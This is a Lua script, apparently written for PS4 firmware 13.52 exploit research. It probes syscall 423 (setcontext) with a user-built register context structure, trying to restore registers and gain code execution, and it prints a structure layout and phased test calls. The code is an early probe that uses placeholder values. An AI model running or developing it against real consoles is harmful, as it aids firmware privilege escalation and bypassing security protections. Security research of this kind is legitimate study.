------------------------------------------------------------
PS4 FW 13.52 - CONTEXT RESTORE EXPLOIT
Target: syscall 0x1a7 (423) setcontext/swapcontext primitive

Vulnerability: The syscall reads a full register context from
a user-controlled structure. If we can control the structure,
we can:
  1. Restore arbitrary register values
  2. Execute code at controlled addresses
  3. Bypass SMEP/SMAP if we can control CR3/CR4

Context Structure Layout:
  +0x00: RDI
  +0x08: RSI
  +0x10: RDX
  +0x18: RCX
  +0x20: R8
  +0x28: R9
  +0x30: RAX
  +0x38: RBX
  +0x40: RBP
  +0x48: R12
  +0x50: R13
  +0x58: R14
  +0x60: R15
  +0x68: RSP
  +0x70: (padding)
  +0x78: (padding)
  +0x80: (padding)
  +0x88: (padding)
  +0x90: (padding)
  +0x98: (padding)
  +0xA0: (padding)
  +0xA8: (padding)
  +0xB0: (padding)
  +0xB8: (padding)
  +0xC0: (padding)
  +0xC8: (padding)
  +0xD0: (padding)
  +0xD8: (padding)
  +0xE0: Return address
  +0xE8: (padding)
  +0xF0: (padding)
  +0xF8: (padding)
  +0x100: Magic 0x20001
  +0x104: Magic 0x10002
  +0x108-0x11F: (padding)
  +0x120: FPU state (512 bytes)

Status: May crash if setcontext executes, but useful for code execution
------------------------------------------------------------

function read_qw(addr)
  local b0 = memory.read_byte(addr)
  local b1 = memory.read_byte(addr + 1)
  local b2 = memory.read_byte(addr + 2)
  local b3 = memory.read_byte(addr + 3)
  local b4 = memory.read_byte(addr + 4)
  local b5 = memory.read_byte(addr + 5)
  local b6 = memory.read_byte(addr + 6)
  local b7 = memory.read_byte(addr + 7)
  return b0 + b1*256 + b2*65536 + b3*16777216 + b4*4294967296 + b5*1099511627776 + b6*281474976710656 + b7*72057594037927936
end

local function s(n, a1, a2, a3, a4, a5, a6)
  local stub = syscall_stub[n]
  if not stub then stub = syscall_stub[675] end
  return native.fcall_with_rax(stub + 10, n, a1 or 0, a2 or 0, a3 or 0, a4 or 0, a5 or 0, a6 or 0)
end

------------------------------------------------------------
-- PHASE 1: Probe syscall 423
------------------------------------------------------------
function phase1_probe_423()
  print("\n=== PHASE 1: Probe Syscall 423 ===")

  -- Try with NULL pointer (should fail safely)
  local r = s(423, 0, 0, 0, 0, 0)
  print(string.format("  syscall 423(NULL) = 0x%x", r))

  -- Try with small values
  r = s(423, 1, 0, 0, 0, 0)
  print(string.format("  syscall 423(1) = 0x%x", r))

  r = s(423, 0x100, 0, 0, 0, 0)
  print(string.format("  syscall 423(0x100) = 0x%x", r))

  -- Check if it crashes or returns error
  if r == 0 then
    print("  Syscall 423 accepts arguments!")
  elseif r == 0xffffffffffffffda then
    print("  Syscall 423: ENOSYS (not implemented)")
  elseif r == 0xffffffffffffffe2 then
    print("  Syscall 423: EINVAL (invalid argument)")
  else
    print(string.format("  Syscall 423: unknown return 0x%x", r))
  end

  return r
end

------------------------------------------------------------
-- PHASE 2: Context structure setup
------------------------------------------------------------
function phase2_context_setup()
  print("\n=== PHASE 2: Context Structure Setup ===")

  -- Allocate context structure (0x320 bytes)
  local ctx = memory.alloc(0x400)
  for i = 0, 0x3FF do memory.write_byte(ctx + i, 0) end

  -- Set up register context
  memory.write_qword(ctx + 0x00, 0x1111111111111111)  -- RDI
  memory.write_qword(ctx + 0x08, 0x2222222222222222)  -- RSI
  memory.write_qword(ctx + 0x10, 0x3333333333333333)  -- RDX
  memory.write_qword(ctx + 0x18, 0x4444444444444444)  -- RCX
  memory.write_qword(ctx + 0x20, 0x5555555555555555)  -- R8
  memory.write_qword(ctx + 0x28, 0x6666666666666666)  -- R9
  memory.write_qword(ctx + 0x30, 0x7777777777777777)  -- RAX
  memory.write_qword(ctx + 0x38, 0x8888888888888888)  -- RBX
  memory.write_qword(ctx + 0x40, 0x9999999999999999)  -- RBP
  memory.write_qword(ctx + 0x48, 0xAAAAAAAAAAAAAAAA)  -- R12
  memory.write_qword(ctx + 0x50, 0xBBBBBBBBBBBBBBBB)  -- R13
  memory.write_qword(ctx + 0x58, 0xCCCCCCCCCCCCCCCC)  -- R14
  memory.write_qword(ctx + 0x60, 0xDDDDDDDDDDDDDDDD)  -- R15
  memory.write_qword(ctx + 0x68, ctx + 0x200)         -- RSP (point to safe area)

  -- Return address (where to go after context restore)
  memory.write_qword(ctx + 0xE0, ctx + 0x200)

  -- Magic values for FPU restore
  memory.write_dword(ctx + 0x100, 0x20001)
  memory.write_dword(ctx + 0x104, 0x10002)

  -- Fill FPU state area with recognizable pattern
  for i = 0, 511 do
    memory.write_byte(ctx + 0x120 + i, 0xCC)
  end

  print(string.format("  Context structure at: 0x%x", ctx))
  print("  Registers set to pattern values")
  print("  Magic values set for FPU restore")

  return ctx
end

------------------------------------------------------------
-- PHASE 3: Attempt context restore
------------------------------------------------------------
function phase3_context_restore(ctx)
  print("\n=== PHASE 3: Context Restore Attempt ===")

  -- Method 1: Direct call
  print("  Method 1: Direct syscall 423")
  local r = s(423, ctx, 0, 0, 0, 0)
  print(string.format("  Result: 0x%x", r))

  -- Method 2: With different first argument
  print("  Method 2: syscall 423 with offset")
  r = s(423, ctx + 0x100, 0, 0, 0, 0)
  print(string.format("  Result: 0x%x", r))

  -- Method 3: Try to trigger FPU restore
  print("  Method 3: syscall 423 with FPU magic")
  r = s(423, ctx + 0x100, 1, 0, 0, 0)
  print(string.format("  Result: 0x%x", r))

  -- If we get here, setcontext did not execute (or crashed and recovered)
  print("  (If we reach here, setcontext did not execute)")
  print("  Context structure is still at: " .. string.format("0x%x", ctx))
end

------------------------------------------------------------
-- PHASE 4: Check for register modification
------------------------------------------------------------
function phase4_check_registers()
  print("\n=== PHASE 4: Check Register State ===")

  -- Read context structure to see if it was modified
  local ctx = memory.alloc(0x400)
  for i = 0, 0x3FF do memory.write_byte(ctx + i, 0) end

  -- Fill with pattern
  for i = 0, 0x3FF do
    memory.write_byte(ctx + i, 0xAA)
  end

  -- Call syscall 423
  local r = s(423, ctx, 0, 0, 0, 0)

  -- Check if pattern was overwritten
  local modified = false
  for i = 0, 0x3FF do
    if memory.read_byte(ctx + i) ~= 0xAA then
      modified = true
      break
    end
  end

  if modified then
    print("  Context structure was modified!")
    -- Dump first 256 bytes
    for i = 0, 255, 16 do
      local line = string.format("  [%03x] ", i)
      for j = 0, 15 do
        line = line .. string.format("%02x ", memory.read_byte(ctx + i + j))
      end
      print(line)
    end
  else
    print("  Context structure unchanged")
  end
end

------------------------------------------------------------
-- MAIN
------------------------------------------------------------
print("============================================")
print("PS4 FW 13.52 - CONTEXT RESTORE EXPLOIT")
print("============================================")

-- Phase 1: Probe syscall
local r = phase1_probe_423()

-- Phase 2: Setup context
local ctx = phase2_context_setup()

-- Phase 3: Attempt restore (may crash)
phase3_context_restore(ctx)

-- Phase 4: Check results
phase4_check_registers()

print("\n============================================")
print("COMPLETE")
print("============================================")
